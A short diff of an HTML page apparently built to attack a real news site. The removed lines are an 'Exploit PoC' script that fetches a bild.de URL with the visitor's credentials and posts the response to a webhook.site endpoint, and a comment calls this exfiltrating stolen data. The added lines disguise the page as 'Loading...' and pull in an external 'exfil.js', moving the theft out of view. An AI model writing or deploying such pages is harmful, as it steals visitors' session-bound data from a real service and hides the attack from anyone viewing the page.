@@ -1,20 +1,7 @@
+<!DOCTYPE html>
 <html>
-<body>
-  <h1>Exploit PoC</h1>
-  <script>
-  fetch('https://www.bild.de/sitemap-index-200605.xml?poison=1', {
-    credentials: 'include',
-    mode: 'cors'
-  })
-  .then(res => res.text())
-  .then(data => {
-    // Exfiltrate or display the stolen data
-    console.log("Leaked content:", data);
-    fetch('https://webhook.site/your-id', {
-      method: 'POST',
-      body: data
-    });
-  });
-</script>
-</body>
+  <body>
+    <h1>Loading...</h1>
+    <script src="exfil.js"></script>
+  </body>
 </html>
